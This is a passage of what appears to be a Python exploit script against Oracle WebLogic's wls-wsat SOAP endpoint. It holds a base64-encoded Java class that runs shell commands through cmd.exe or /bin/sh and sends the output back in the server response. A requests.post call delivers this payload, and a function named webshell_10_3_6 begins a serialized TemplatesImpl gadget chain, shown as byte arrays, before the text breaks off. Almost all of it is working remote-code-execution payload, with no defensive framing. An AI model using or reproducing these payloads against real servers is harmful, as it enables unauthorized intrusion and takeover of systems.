<string>yv66vgAAADIAYwoAFAA8CgA9AD4KAD0APwoAQABBBwBCCgAFAEMHAEQKAAcARQgARgoABwBHBwBICgALADwKAAsASQoACwBKCABLCgATAEwHAE0IAE4HAE8HAFABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEExSZXN1bHRCYXNlRXhlYzsBAAhleGVjX2NtZAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABcAEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAANmaXMBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAZyZXN1bHQBAA1TdGFja01hcFRhYmxlBwBRBwBSBwBTBwBCBwBEAQAKRXhjZXB0aW9ucwEAB2RvX2V4ZWMBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247BwBNBwBUAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAChSZXN1bHRCYXNlRXhlYy5qYXZhIGZyb20gSW5wdXRGaWxlT2JqZWN0DAAVABYHAFUMAFYAVwwAWABZBwBSDABaAFsBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyDAAVAFwBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyDAAVAF0BAAAMAF4AXwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABgAGEMAGIAXwEAC2NtZC5leGUgL2MgDAAcAB0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALL2Jpbi9zaCAtYyABAA5SZXN1bHRCYXNlRXhlYwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwAhABMAFAAAAAAABAABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAMAGQAAAAwAAQAAAAUAGgAbAAAACQAcAB0AAgAXAAAA+QADAAcAAABOuAACKrYAA0wrtgAETbsABVkstwAGTrsAB1kttwAIOgQBOgUSCToGGQS2AApZOgXGABy7AAtZtwAMGQa2AA0ZBbYADbYADjoGp//fGQawAAAAAwAYAAAAJgAJAAAABgAIAAcADQAIABYACQAgAAoAIwALACcADAAyAA4ASwARABkAAABIAAcAAABOAB4AHwAAAAgARgAgACEAAQANAEEAIgAjAAIAFgA4ACQAJQADACAALgAmACcABAAjACsAKAAfAAUAJwAnACkAHwAGACoAAAAfAAL/ACcABwcAKwcALAcALQcALgcALwcAKwcAKwAAIwAwAAAABAABABEACQAxAB0AAgAXAAAAqgACAAMAAAA3EglMuwALWbcADBIPtgANKrYADbYADrgAEEynABtNuwALWbcADBIStgANKrYADbYADrgAEEwrsAABAAMAGgAdABEAAwAYAAAAGgAGAAAAFgADABkAGgAeAB0AGwAeAB0ANQAfABkAAAAgAAMAHgAXADIAMwACAAAANwAeAB8AAAADADQAKQAfAAEAKgAAABMAAv8AHQACBwArBwArAAEHADQXADAAAAAEAAEANQAJADYANwACABcAAAArAAAAAQAAAAGxAAAAAgAYAAAABgABAAAANgAZAAAADAABAAAAAQA4ADkAAAAwAAAABAABADUAAQA6AAAAAgA7</string> </void> </void> <void class=\"org.mozilla.classfile.DefiningClassLoader\"> <void method=\"defineClass\"> <string>ResultBaseExec</string> <object idref=\"byte_arr\"></object> <void method=\"newInstance\"> <void method=\"do_exec\" id=\"result\"> <string> %s </string> </void> </void> </void> </void> <void class=\"java.lang.Thread\" method=\"currentThread\"> <void method=\"getCurrentWork\" id=\"current_work\"> <void method=\"getClass\"> <void method=\"getDeclaredField\"> <string>connectionHandler</string> <void method=\"setAccessible\"><boolean>true</boolean></void> <void method=\"get\"> <object idref=\"current_work\"></object> <void method=\"getServletRequest\"> <void method=\"getResponse\"> <void method=\"getServletOutputStream\"> <void method=\"writeStream\"> <object class=\"weblogic.xml.util.StringInputStream\"><object idref=\"result\"></object></object> </void> <void method=\"flush\"/> </void> <void method=\"getWriter\"><void method=\"write\"><string></string></void></void> </void> </void> </void> </void> </void> </void> </void> </java> </string> </void> </class> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>''' % ( cmd ) url = \" %s /wls-wsat/CoordinatorPortType\" % ( ip ) rsp = requests . post ( url , data = body , verify = False , headers = headers ) logger . info ( \" \\r\\n \" + rsp . text ) def webshell_10_3_6 ( ip ): body = '''<?xml version=\"1.0\" encoding=\"utf-8\" ?> <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action/><wsa:RelatesTo/><asy:onAsyncDelivery/> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void> <array class=\"byte\" length=\"4346\"><void index=\"0\"><byte>-84</byte></void><void index=\"1\"><byte>-19</byte></void><void index=\"2\"><byte>0</byte></void><void index=\"3\"><byte>5</byte></void><void index=\"4\"><byte>115</byte></void><void index=\"5\"><byte>114</byte></void><void index=\"6\"><byte>0</byte></void><void index=\"7\"><byte>23</byte></void><void index=\"8\"><byte>106</byte></void><void index=\"9\"><byte>97</byte></void><void index=\"10\"><byte>118</byte></void><void index=\"11\"><byte>97</byte></void><void index=\"12\"><byte>46</byte></void><void index=\"13\"><byte>117</byte></void><void index=\"14\"><byte>116</byte></void><void index=\"15\"><byte>105</byte></void><void index=\"16\"><byte>108</byte></void><void index=\"17\"><byte>46</byte></void><void index=\"18\"><byte>76</byte></void><void index=\"19\"><byte>105</byte></void><void index=\"20\"><byte>110</byte></void><void index=\"21\"><byte>107</byte></void><void index=\"22\"><byte>101</byte></void><void index=\"23\"><byte>100</byte></void><void index=\"24\"><byte>72</byte></void><void index=\"25\"><byte>97</byte></void><void index=\"26\"><byte>115</byte></void><void index=\"27\"><byte>104</byte></void><void index=\"28\"><byte>83</byte></void><void index=\"29\"><byte>101</byte></void><void index=\"30\"><byte>116</byte></void><void index=\"31\"><byte>-40</byte></void><void index=\"32\"><byte>108</byte></void><void index=\"33\"><byte>-41</byte></void><void index=\"34\"><byte>90</byte></void><void index=\"35\"><byte>-107</byte></void><void index=\"36\"><byte>-35</byte></void><void index=\"37\"><byte>42</byte></void><void index=\"38\"><byte>30</byte></void><void index=\"39\"><byte>2</byte></void><void index=\"40\"><byte>0</byte></void><void index=\"41\"><byte>0</byte></void><void index=\"42\"><byte>120</byte></void><void index=\"43\"><byte>114</byte></void><void index=\"44\"><byte>0</byte></void><void index=\"45\"><byte>17</byte></void><void index=\"46\"><byte>106</byte></void><void index=\"47\"><byte>97</byte></void><void index=\"48\"><byte>118</byte></void><void index=\"49\"><byte>97</byte></void><void index=\"50\"><byte>46</byte></void><void index=\"51\"><byte>117</byte></void><void index=\"52\"><byte>116</byte></void><void index=\"53\"><byte>105</byte></void><void index=\"54\"><byte>108</byte></void><void index=\"55\"><byte>46</byte></void><void index=\"56\"><byte>72</byte></void><void index=\"57\"><byte>97</byte></void><void index=\"58\"><byte>115</byte></void><void index=\"59\"><byte>104</byte></void><void index=\"60\"><byte>83</byte></void><void index=\"61\"><byte>101</byte></void><void index=\"62\"><byte>116</byte></void><void index=\"63\"><byte>-70</byte></void><void index=\"64\"><byte>68</byte></void><void index=\"65\"><byte>-123</byte></void><void index=\"66\"><byte>-107</byte></void><void index=\"67\"><byte>-106</byte></void><void index=\"68\"><byte>-72</byte></void><void index=\"69\"><byte>-73</byte></void><void index=\"70\"><byte>52</byte></void><void index=\"71\"><byte>3</byte></void><void index=\"72\"><byte>0</byte></void><void index=\"73\"><byte>0</byte></void><void index=\"74\"><byte>120</byte></void><void index=\"75\"><byte>112</byte></void><void index=\"76\"><byte>119</byte></void><void index=\"77\"><byte>12</byte></void><void index=\"78\"><byte>0</byte></void><void index=\"79\"><byte>0</byte></void><void index=\"80\"><byte>0</byte></void><void index=\"81\"><byte>16</byte></void><void index=\"82\"><byte>63</byte></void><void index=\"83\"><byte>64</byte></void><void index=\"84\"><byte>0</byte></void><void index=\"85\"><byte>0</byte></void><void index=\"86\"><byte>0</byte></void><void index=\"87\"><byte>0</byte></void><void index=\"88\"><byte>0</byte></void><void index=\"89\"><byte>2</byte></void><void index=\"90\"><byte>115</byte></void><void index=\"91\"><byte>114</byte></void><void index=\"92\"><byte>0</byte></void><void index=\"93\"><byte>58</byte></void><void index=\"94\"><byte>99</byte></void><void index=\"95\"><byte>111</byte></void><void index=\"96\"><byte>109</byte></void><void index=\"97\"><byte>46</byte></void><void index=\"98\"><byte>115</byte></void><void index=\"99\"><byte>117</byte></void><void index=\"100\"><byte>110</byte></void><void index=\"101\"><byte>46</byte></void><void index=\"102\"><byte>111</byte></void><void index=\"103\"><byte>114</byte></void><void index=\"104\"><byte>103</byte></void><void index=\"105\"><byte>46</byte></void><void index=\"106\"><byte>97</byte></void><void index=\"107\"><byte>112</byte></void><void index=\"108\"><byte>97</byte></void><void index=\"109\"><byte>99</byte></void><void index=\"110\"><byte>104</byte></void><void index=\"111\"><byte>101</byte></void><void index=\"112\"><byte>46</byte></void><void index=\"113\"><byte>120</byte></void><void index=\"114\"><byte>97</byte></void><void index=\"115\"><byte>108</byte></void><void index=\"116\"><byte>97</byte></void><void index=\"117\"><byte>110</byte></void><void index=\"118\"><byte>46</byte></void><void index=\"119\"><byte>105</byte></void><void index=\"120\"><byte>110</byte></void><void index=\"121\"><byte>116</byte></void><void index=\"122\"><byte>101</byte></void><void index=\"123\"><byte>114</byte></void><void index=\"124\"><byte>110</byte></void><void index=\"125\"><byte>97</byte></void><void index=\"126\"><byte>108</byte></void><void index=\"127\"><byte>46</byte></void><void index=\"128\"><byte>120</byte></void><void index=\"129\"><byte>115</byte></void><void index=\"130\"><byte>108</byte></void><void index=\"131\"><byte>116</byte></void><void index=\"132\"><byte>99</byte></void><void index=\"133\"><byte>46</byte></void><void index=\"134\"><byte>116</byte></void><void index=\"135\"><byte>114</byte></void><void index=\"136\"><byte>97</byte></void><void index=\"137\"><byte>120</byte></void><void index=\"138\"><byte>46</byte></void><void index=\"139\"><byte>84</byte></void><void index=\"140\"><byte>101</byte></void><void index=\"141\"><byte>109</byte></void><void index=\"142\"><byte>112</byte></void><void index=\"143\"><byte>108</byte></void><void index=\"144\"><byte>97</byte></void><void index=\"145\"><byte>116</byte></void><void index=\"146\"><byte>101</byte></void><void index=\"147\"><byte>115</byte></void><void index=\"148\"><byte>73</byte></void><void index=\"149\"><byte>109</byte></void><void index=\"150\"><byte>112</byte></void><void index=\"151\"><byte>108</byte></void><void index=\"152\"><byte>9</byte></void><void index=\"153\"><byte>87</byte></void><void index=\"154\"><byte>79</byte></void><void index=\"155\"><byte>-63</byte></void><void index=\"156\"><byte>110</byte></void><void index=\"157\"><byte>-84</byte></void><void index=\"158\"><byte>-85</byte></void><void index=\"159\"><byte>51</byte></void><void index=\"160\"><byte>3</byte></void><void index=\"161\"><byte>0</byte></void><void index=\"162\"><byte>9</byte></void><void index=\"163\"><byte>73</byte></void><void index=\"164\"><byte>0</byte></void><void index=\"165\"><byte>13</byte></void><void index=\"166\"><byte>95</byte></void><void index=\"167\"><byte>105</byte></void><void index=\"168\"><byte>110</byte></void><void index=\"169\"><byte>100</byte></void><void index=\"170\"><byte>101</byte></void><void index=\"171\"><byte>110</byte></void><void index=\"172\"><byte>116</byte></void><void index=\"173\"><byte>78</byte></void><void index=\"174\"><byte>117</byte></void><void index=\"175\"><byte>109</byte></void><void index=\"176\"><byte>98</byte></void><void index=\"177\"><byte>101</byte></void><void index=\"178\"><byte>114</byte></void><void index=\"179\"><byte>73</byte></void><void index=\"180\"><byte>0</byte></void><void index=\"181\"><byte>14</byte></void><void index=\"182\"><byte>95</byte></void><void index=\"183\"><byte>116</byte></void><void index=\"184\"><byte>114</byte></void><void index=\"185\"><byte>97</byte></void><void index=\"186\"><byte>110</byte></void><void index=\"187\"><byte>115</byte></void><void index=\"188\"><byte>108</byte></void><void index=\"189\"><byte>101</byte></void><void index=\"190\"><byte>116</byte></void><void index=\"191\"><byte>73</byte></void><void index=\"192\"><byte>110</byte></void><void index=\"193\"><byte>100</byte></void><void index=\"194\"><byte>101</byte></void><void index=\"195\"><byte>120</byte></void><void index=\"196\"><byte>90</byte></void><void index=\"197\"><byte>0</byte></void><void index=\"198\"><byte>21</byte></void><void index=\"199\"><byte>95</byte></void><void index=\"200\"><byte>117</byte></void><void index=\"201\"><byte>115</byte></void><void index=\"202\"><byte>101</byte></void><void index=\"203\"><byte>83</byte></void><void index=\"204\"><byte>101</byte></void><void index=\"205\"><byte>114</byte></void><void index=\"206\"><byte>118</byte></void><void index=\"207\"><byte>105</byte></void><void index=\"208\"><byte>99</byte></void><void index=\"209\"><byte>101</byte></void><void index=\"210\"><byte>115</byte></void><void index=\"211\"><byte>77</byte></void><void index=\"212\"><byte>101</byte></void><void index=\"213\"><byte>99</byte></void><void index=\"214\"><byte>104</byte></void><void index=\"215\"><byte>97</byte></void><void index=\"216\"><byte>110</byte></void><void index=\"217\"><byte>105</byte></void><void index=\"218\"><byte>115</byte></void><void index=\"219\"><byte>109</byte></void><void index=\"220\"><byte>76</byte></void><void index=\"221\"><byte>0</byte></void><void index=\"222\"><byte>25</byte></void><void index=\"223\"><byte>95</byte></void><void index=\"224\"><byte>97</byte></void><void index=\"225\"><byte>99</byte></void><void index=\"226\"><byte>99</byte></void><void index=\"227\"><byte>101</byte></void><void index=\"228\"><byte>115</byte></void><void index=\"229\"><byte>115</byte></void><void index=\"230\"><byte>69</byte></void><void index=\"231\"><byte>120</byte></void><void index=\"232\"><byte>116</byte></void><void index=\"233\"><byte>101</byte></void><void index=\"234\"><byte>114</byte></void><void index=\"235\"><byte>110</byte></void><void index=\"236\"><byte>97</byte></void><void index=\"237\"><byte>108</byte></void><void index=\"238\"><byte>83</byte></void><void index=\"239\"><byte>116</byte></void><void index=\"240\"><byte>121</byte></void><void index=\"241\"><byte>108</byte></void><void index=\"242\"><byte>101</byte></void><void index=\"243\"><byte>115</byte></void><void index=\"244\"><byte>104</byte></void><void index=\"245\"><byte>101</byte></void><void index=\"246\"><byte>101</byte></void><void index=\"247\"><byte>116</byte></void><void index=\"248\"><byte>116</byte></void><void index=\"249\"><byte>0</byte></void><void index=\"250\"><byte>18</byte></void><void index=\"251\"><byte>76</byte></void><void index=\"252\"><byte>106</byte></void><void index=\"253\"><byte>97</byte></void><void index=\"254\"><byte>118</byte></void><void index=\"255\"><byte>97</byte></void><void index=\"256\"><byte>47</byte></void><void index=\"257\"><byte>108</byte></void><void index=\"258\"><byte>97</byte></void><void index=\"259\"><byte>110</byte></void><void index=\"260\"><byte>103</byte></void><void index=\"261\"><byte>47</byte></void><void index=\"262\"><byte>83</byte></void><void index=\"263\"><byte>116</byte></void><void index=\"264\"><byte>114</byte></void><void index=\"265\"><byte>105</byte></void><void index=\"266\"><byte>110</byte></void><void index=\"267\"><byte>103</byte></void><void index=\"268\"><byte>59</byte></void><void index=\"269\"><byte>76</byte></void><void index=\"270\"><byte>0</byte></void><void index=\"271\"><byte>11</byte></void><void index=\"272\"><byte>95</byte></void><void index=\"273\"><byte>97</byte></void><void index=\"274\"><byte>117</byte></void><void index=\"275\"><byte>120</byte></void><void index=\"276\"><byte>67</byte></void><void index=\"277\"><byte>108</byte></void><void index=\"278\"><byte>97</byte></void><void index=\"279\"><byte>115</byte></void><void index=\"280\"><byte>115</byte></void><void index=\"281\"><byte>101</byte></void><void index=\"282\"><byte>115</byte></void><void index=\"283\"><byte>116</byte></void><void index=\"284\"><byte>0</byte></void><void index=\"285\"><byte>59</byte></void><void index=\"286\"><byte>76</byte></void><void index=\"287\"><byte>99</byte></void><void index=\"288\"><byte>111</byte></void><void index=\"289\"><byte>109</byte></void><void index=\"290\"><byte>47</byte></void><void index=\"291\"><byte>115</byte></void><void index=\"292\"><byte>117</byte></void><void index=\"293\"><byte>110</byte></void><void index=\"294\"><byte>47</byte></void><void index=\"295\"><byte>111</byte></void><void index=\"296\"><byte>114</byte></void><void index=\"297\"><byte>103</byte></void><void index=\"298\"><byte>47</byte></void><void index=\"299\"><byte>97</byte></void><void index=\"300\"><byte>112</byte></void><void index=\"301\"><byte>97</byte></void><void index=\"302\"><byte>99</byte></void><void index=\"303\"><byte>104</byte></void><void index=\"304\"><byte>101</byte></void><void index=\"305\"><byte>47</byte></void><void index=\"306\"><byte>120</byte></void><void index=\"307\"><byte>97</byte></void><void index=\"308\"><byte>108</byte></void><void index=\"309\"><byte>97</byte></void><void index=\"310\"><byte>110</byte></void><void index=\"311\"><byte>47</byte></void><void index=\"312\"><byte>105</byte></void><void index=\"313\"><byte>110</byte></void><void index=\"314\"><byte>116</byte></void><void index=\"315\"><byte>101</byte></void><void index=\"316\"><byte>114</byte></void><void index=\"317\"><byte>110</byte></void><void index=\"318\"><byte>97</byte></void><void index=\"319\"><byte>108</byte></void><void index=\"320\"><byte>47</byte></void><void index=\"321\"><byte>120</byte></void><void index=\"322\"><byte>115</byte></void><void index=\"323\"><byte>108</byte></void><void index=\"324\"><byte>116</byte></void><void index=\"325\"><byte>99</byte></void><void index=\"326\"><byte>47</byte></void><void index=\"327\"><byte>114</byte></void><void index=\"328\"><byte>117</byte></void><void index=\"329\"><byte>110</byte></void><void index=\"330\"><byte>116</byte></void><void index=\"331\"><byte>105</byte></void><void index=\"332\"><byte>109</byte></void><void index=\"333\"><byte>101</byte></void><void index=\"334\"><byte>47</byte></void><void index=\"335\"><byte>72</byte></void><void index=\"336\"><byte>97</byte></void><void index=\"337\"><byte>115</byte></void><void index=\"338\"><byte>104</byte></void><void index=\"339\"><byte>116</byte></void><void index=\"340\"><byte>97</byte></void><void index=\"341\"><byte>98</byte></void><void index=\"342\"><byte>108</byte></void><void index=\"343\"><byte>101</byte></void><void index=\"344\"><byte>59</byte></void><void index=\"345\"><byte>91</byte></void><void index=\"346\"><byte>0</byte></void><void index=\"347\"><byte>10</byte></void><void index=\"348\"><byte>95</byte></void><void index=\"349\"><byte>98</byte></void><void index=\"350\"><byte>121</byte></void><void index=\"351\"><byte>116</byte></void><void index=\"352\"><byte>101</byte></void><void index=\"353\"><byte>99</byte></void><void index=\"354\"><byte>111</byte></void><void index=\"355\"><byte>100</byte></void><void index=\"356\"><byte>101</byte></void><void index=\"357\"><byte>115</byte></void><void index=\"358\"><byte>116</byte></void><void index=\"359\"><byte>0</byte></void><void index=\"360\"><byte>3</byte></void><void index=\"361\"><byte>91</byte></void><void index=\"362\"><byte>91</byte></void><void index=\"363\"><byte>66</byte></void><void index=\"364\"><byte>91</byte></void><void index=\"365\"><byte>0</byte></void><void index=\"366\"><byte>6</byte></void><void index=\"367\"><byte>95</byte></void><void index=\"368\"><byte>99</byte></void><void index=\"369\"><byte>108</byte></void><void index=\"370\"><byte>97</byte></void><void index=\"371\"><byte>115</byte></void><void index=\"372\"><byte>115</byte></void><void index=\"373\"><byte>116</byte></void><void index=\"374\"><byte>0</byte></void><void index=\"375\"><byte>18</byte></void><void index=\"376\"><byte>91</byte></void><void index=\"377\"><byte>76</byte></void><void index=\"378\"><byte>106</byte></void><void index=\"379\"><byte>97</byte></void><void index=\"380\"><byte>118</byte></void><void index=\"381\"><byte>97</byte></void><void index=\"382\"><byte>47</byte></void><void index=\"383\"><byte>108</byte></void><void index=\"384\"><byte>97</byte></void><void index=\"385\"><byte>110</byte></void><void index=\"386\"><byte>103</byte></void><void index=\"387\"><byte>47</byte></void><void index=\"388\"><byte>67</byte></void><void index=\"389\"><byte>108</byte></void><void index=\"390\"><byte>97</byte></void><void index=\"391\"><byte>115</byte></void><void index=\"392\"><byte>115</byte></void><void index=\"393\"><byte>59</byte></void><void index=\"394\"><byte>76</byte></void><void index=\"395\"><byte>0</byte></void><void index=\"396\"><byte>5</byte></void><void index=\"397\"><byte>95</byte></void><void index=\"398\"><byte>110</byte></void><void index=\"399\"><byte>97</byte></void><void index=\"400\"><byte>109</byte></void><void index=\"401\"><byte>101</byte></void><void index=\"402\"><byte>113</byte></void><void index=\"403\"><byte>0</byte></void><void index=\"404\"><byte>126</byte></void><void index=\"405\"><byte>0</byte></void><void index=\"406\"><byte>4</byte></void><void index=\"407\"><byte>76</byte></void><void index=\"408\"><byte>0</byte></void><void index=\"409\"><byte>17</byte></void><void index=\"410\"><byte>95</byte></void><void index=\"411\"><byte>111</byte></void><void index=\"412\"><byte>117</byte></void><void index=\"413\"><byte>116</byte></void><void index=\"414\"><byte>112</byte></void><void index=\"415\"><byte>117</byte></void><void index=\"416\"><byte>116</byte></void><void index=\"417\"><byte>80</byte></void><void index=\"418\"><byte>114</byte></void><void index=\"419\"><byte>111</byte></void><void index=\"420\"><byte>112</byte></void><void index=\"421\"><byte>101</byte></void><void index=\"422\"><byte>114</byte></void><void index=\"423\"><byte>116</byte></void><void index=\"424\"><byte>105</byte></void><void index=\"425\"><byte>101</byte></void><void index=\"426\"><byte>115</byte></void><void index=\"427\"><byte>116</byte></void><void index=\"428\"><byte>0</byte></void><void index=\"429\"><byte>22</byte></void><void index=\"430\"><byte>76</byte></void><void index=\"431\"><byte>106</byte></void><void index=\"432\"><byte>97</byte></void><void index=\"433\"><byte>118</byte></void><void index=\"434\"><byte>97</byte></void><void index=\"435\"><byte>47</byte></void><void index=\"436\"><byte>117</byte></void><void index=\"437\"><byte>116</byte></void><void index=\"438\"><byte>105</byte></void><void index=\"439\"><byte>108</byte></void><void index=\"440\"><byte>47</byte></void><void index=\"441\"><byte>80</byte></void><void index=\"442\"><byte>114</byte></void><void index=\"443\"><byte>111</byte></void><void index=\"444\"><byte>112</byte></void><void index=\"445\"><byte>101</byte></void><void index=\"446\"><byte>114</byte></void><void index=\"447\"><byte>116</byte></void><void index=\"448\"><byte>105</byte></void><void index=\"449\"><byte>101</byte></void><void index=\"450\"><byte>115</byte></void><void index=\"451\"><byte>59</byte></void><void index=\"452\"><byte>120</byte></void><void index=\"453\"><byte>112</byte></void><void index=\"454\"><byte>0</byte></void><void index=\"455\"><byte>0</byte></void><void index=\"456\"><byte>0</byte></void><void index=\"457\"><byte>0</byte></void><void index=\"458\"><byte>-1</byte></void><void index=\"459\"><byte>-1</byte></void><void index=\"460\"><byte>-1</byte></void><void index=\"461\"><byte>-1</byte></void><void index=\"462\"><byte>0</byte></void><void index=\"463\"><byte>116</byte></void><void index=\"464\"><byte>0</byte></void><void index=\"465\"><byte>3</byte></void><void index=\"466\"><byte>97</byte></void><void index=\"467\"><byte>108</byte></void><void index=\"468\"><byte>108</byte></void><void index=\"469\"><byte>112</byte></void><void index=\"470\"><byte>117</byte></void><void index=\"471\"><byte>114</byte></void><void index=\"472\"><byte>0</byte></void><void index=\"473\"><byte>3</byte></void><void index=\"474\"><byte>91</byte></void><void index=\"475\"><byte>91</byte></void><void index=\"476\"><byte>66</byte></void><void index=\"477\"><byte>75</byte></void><void index=\"478\"><byte>-3</byte></void><void index=\"479\"><byte>25</byte></void><void index=\"480\"><byte>21</byte></void><void index=\"481\"><byte>103</byte></void><void index=\"482\"><byte>103</byte></void><void index=\"483\"><byte>-37</byte></void><void index=\"484\"><byte>55</byte></void><void index=\"485\"><byte>2</byte></void><void index=\"486\"><byte>0</byte></void><void index=\"487\"><byte>0</byte></void><void index=\"488\"><byte>120</byte></void><void index=\"489\"><byte>112</byte></void><void index=\"490\"><byte>0</byte></void><void index=\"491\"><byte>0</byte></void><void index=\"492\"><byte>0</byte></void><void index=\"493\"><byte>2</byte></void><void index=\"494\"><byte>117</byte></void><void index=\"495\"><byte>114</byte></void><void index=\"496\"><byte>0</byte></void><void index=\"497\"><byte>2</byte></void><void index=\"498\"><byte>91</byte></void><void index=\"499\"><byte>66</byte></void><void index=\"500\"><byte>-84</byte></void><void index=\"501\"><byte>-13</byte></void><void index=\"502\"><byte>23</byte></void><void index=\"503\"><byte>-8</byte></void><void index=\"504\"><byte>6</byte></void><void index=\"505\"><byte>8</byte></void><void index=\"506\"><byte>84</byte></void><void index=\"507\"><byte>-32</byte></void><void index=\"508\"><byte>2</byte></void><void index=\"509\"><byte>0</byte></void><void index=\"510\"><byte>0</byte></void><void index=\"511\"><byte>120</byte></void><void index=\"512\"><byte>112</byte></void><void index=\"513\"><byte>0</byte></void><void index=\"514\"><byte>0</byte></void><void index=\"515\"><byte>11</byte></void><void index=\"516\"><byte>-123</byte></void><void index=\"517\"><byte>-54</byte></void><void index=\"518\"><byte>-2</byte></void><void index=\"519\"><byte>-70</byte></void><void index=\"520\"><byte>-66</byte></void><void index=\"521\"><byte>0</byte></void><void index=\"522\"><byte>0</byte></void><void index=\"523\"><byte>0</byte></void><void index=\"524\"><byte>50</byte></void><void index=\"525\"><byte>0</byte></void><void index=\"526\"><byte>81</byte></void><void index=\"527\"><byte>10</byte></void><void index=\"528\"><byte>0</byte></void><void index=\"529\"><byte>3</byte></void><void index=\"530\"><byte>0</byte></void><void index=\"531\"><byte>34</byte></void><void index=\"532\"><byte>7</byte></void><void index=\"533\"><byte>0</byte></void><void index=\"534\"><byte>79</byte></void><void index=\"535\"><byte>7</byte></void><void index=\"536\"><byte>0</byte></void><void index=\"537\"><byte>37</byte></void><void index=\"538\"><byte>7</byte></void><void index=\"539\"><byte>0</byte></void><void index=\"540\"><byte>38</byte></void><void index=\"541\"><byte>1</byte></void><void index=\"542\"><byte>0</byte></void><void index=\"543\"><byte>16</byte></void><void index=\"544\"><byte>115</byte></void><void index=\"545\"><byte>101</byte></void><void index=\"546\"><byte>114</byte></void><void index=\"547\"><byte>105</byte></void><void index=\"548\"><byte>97</byte></void><void index=\"549\"><byte>108</byte></void><void index=\"550\"><byte>86</byte></void><void index=\"551\"><byte>101</byte></void><void index=\"552\"><byte>114</byte></void><void index=\"553\"><byte>115</byte></void><void index=\"554\"><byte>105</byte></void><void index=\"555\"><byte>111</byte></void><void index=\"556\"><byte>110</byte></void><void index=\"557\"><byte>85</byte></void><void index=\"558\"><byte>73</byte></void><void index=\"559\"><byte>68</byte></void><void index=\"560\"><byte>1</byte></void><void index=\"561\"><byte>0</byte></void><void index=\"562\"><byte>1</byte></void><void index=\"563\"><byte>74</byte></void><void index=\"564\"><byte>1</byte></void><void index=\"565\"><byte>0</byte></void><void index=\"566\"><byte>13</byte></void><void index=\"567\"><byte>67</byte></void><void index=\"568\"><byte>111</byte></void><void index=\"569\"><byte>110</byte></void><void index=\"570\"><byte>115</byte></void><void index=\"571\"><byte>116</byte></void><void index=\"572\"><byte>97</byte></void><void index=\"573\"><byte>110</byte></void><void index=\"574\"><byte>116</byte></void><void index=\"575\"><byte>86</byte></void><void index=\"576\"><byte>97</byte></void><void index=\"577\"><byte>108</byte></void><void index=\"578\"><byte>117</byte></void><void index=\"579\"><byte>101</byte></void><void index=\"580\"><byte>5</byte></void><void index=\"581\"><byte>-83</byte></void><void index=\"582\"><byte>32</byte></void><void index=\"583\"><byte>-109</byte></void><void index=\"584\"><byte>-13</byte></void><void index=\"585\"><byte>-111</byte></void><void index=\"586\"><byte>-35</byte></void><void index=\"587\"><byte>-17</byte></void><void index=\"588\"><byte>62</byte></void><void index=\"589\"><byte>1</byte></void><void index=\"590\"><byte>0</byte></void><void index=\"591\"><byte>6</byte></void><void index=\"592\"><byte>60</byte></void><void index=\"593\"><byte>105</byte></void><void index=\"594\"><byte>110</byte></void><void index=\"595\"><byte>105</byte></void><void index=\"596\"><byte>116</byte></void><void index=\"597\"><byte>62</byte></void><void index=\"598\"><byte>1</byte></void><void index=\"599\"><byte>0</byte></void><void index=\"600\"><byte>3</byte></void><void index=\"601\"><byte>40</byte></void><void index=\"602\"><byte>41</byte></void><void index=\"603\"><byte>86</byte></void><void index=\"604\"><byte>1</byte></void><void index=\"605\"><byte>0</byte></void><void index=\"606\"><byte>4</byte></void><void index=\"607\"><byte>67</byte></void><void index=\"608\"><byte>111</byte></void><void index=\"609\"><byte>100</byte></void><void index=\"610\"><byte>101</byte></void><void index=\"611\"><byte>1</byte></void><void index=\"612\"><byte>0</byte></void><void index=\"613\"><byte>15</byte></void><void index=\"614\"><byte>76</byte></void><void index=\"615\"><byte>105</byte></void><void index=\"616\"><byte>110</byte></void><void index=\"617\"><byte>101</byte></void><void index=\"618\"><byte>78</byte></void><void index=\"619\"><byte>117</byte></void><void index=\"620\"><byte>109</byte></void><void 